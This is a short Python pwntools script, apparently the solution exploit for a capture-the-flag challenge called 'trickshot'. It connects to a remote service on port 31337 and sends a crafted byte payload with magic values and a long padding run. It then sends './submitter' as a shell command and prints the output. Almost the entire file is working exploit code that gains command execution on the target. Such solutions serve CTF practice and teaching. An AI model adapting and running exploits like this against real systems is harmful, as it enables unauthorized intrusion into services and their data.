#!/usr/bin/env python3
from pwn import *
import time

#r=process('./trickshot')
HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

r = remote(HOST, int(PORT))
#gdb.attach(r,'b *$rebase(0x01BD6)')

payload=b'a'*4+p16(1)+b'\x11'*4
payload+=b'\x04'+b'fUzZ'+p8(0)+b'tHiS'
payload+=b'\x41'+b'\x01'*3+b'244811'
payload+=b'\x12'+b'\x57'*7+b'\x02\x02'
payload+=b'\x83'+b'\x03\x03\x03\x83'*2+b'\x03'
payload+=b'a'*(0xfe0)

r.recvuntil('Setting you up for a trickshot...')
r.sendline(payload)
time.sleep(1)
r.sendline('./submitter')
print(r.recvall(timeout=3))